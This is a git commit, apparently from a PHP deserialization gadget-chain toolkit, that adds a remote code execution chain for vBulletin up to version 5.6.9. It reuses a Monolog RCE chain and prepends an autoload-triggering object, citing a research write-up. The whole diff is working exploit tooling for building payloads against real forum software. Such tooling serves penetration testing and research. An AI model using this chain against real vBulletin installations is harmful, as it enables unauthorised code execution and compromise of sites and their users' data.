009badd681700372e172eeba31346863991fc0bd
cfreal <folcharles@gmail.com>
2023-02-01 11:11:57 +0100

    Added vBulletin/RCE1

---
+++ gadgetchains/vBulletin/RCE/1/chain.php
@@ -0,0 +1,21 @@
+<?php
+
+namespace GadgetChain\vBulletin;
+
+include(__DIR__ . "/../../../Monolog/RCE/1/chain.php");
+
+# See https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable
+class RCE1 extends \GadgetChain\Monolog\RCE1
+{
+    public static $version = '-5.6.9+';
+    public static $vector = '__destruct';
+    public static $author = 'cfreal';
+
+    public function generate(array $parameters)
+    {
+        return [
+            new \googlelogin_vendor_autoload(),
+            parent::generate($parameters)
+        ];
+    }
+}
---
+++ gadgetchains/vBulletin/RCE/1/gadgets.php
@@ -0,0 +1,5 @@
+<?php
+
+include(__DIR__ . "/../../../Monolog/RCE/1/gadgets.php");
+
+class googlelogin_vendor_autoload {}
